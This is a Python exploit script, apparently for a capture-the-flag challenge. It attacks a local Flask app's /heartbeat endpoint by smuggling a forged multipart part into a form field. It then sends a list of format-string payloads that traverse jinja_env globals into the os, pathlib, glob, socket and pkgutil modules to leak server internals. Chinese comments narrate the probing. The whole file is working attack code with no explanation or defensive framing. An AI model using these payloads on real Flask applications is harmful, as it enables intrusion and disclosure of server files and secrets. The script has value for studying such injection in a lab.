import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

# 检查 Flask/Werkzeug 中可能会触发文件操作的属性

# Flask 的 send_from_directory 需要目录路径
# 但它是一个函数，不能通过 format string 调用

# 让我检查 Path 对象的属性
payloads = [
    # pathlib.Path 可能有有用的属性
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[pathlib].Path.cwd}', 'Path.cwd'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[pathlib].Path.home}', 'Path.home'),
    
    # 检查 Path 类的其他属性
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[pathlib].PurePath.parts}', 'PurePath.parts'),
    
    # 检查 glob 模块
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[glob]._iglob}', 'glob._iglob'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[glob]._isrecursive}', 'glob._isrecursive'),
    
    # 检查是否有 scandir
    ('{0.jinja_env.globals[lipsum].__globals__[os].scandir}', 'os.scandir'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].DirEntry}', 'os.DirEntry'),
    
    # 检查 socket 模块 - 可能有主机名
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[socket].gethostname}', 'gethostname'),
    
    # 检查 importlib
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[importlib.resources]}', 'importlib.resources'),
    
    # 检查 pkgutil
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[pkgutil].get_data}', 'pkgutil.get_data'),
]

for p, desc in payloads:
    try:
        result = format_string_leak(p)
        result = result[:500] if len(result) > 500 else result
        print(f"[{desc}]: {result}")
    except Exception as e:
        print(f"[{desc}]: Error - {e}")
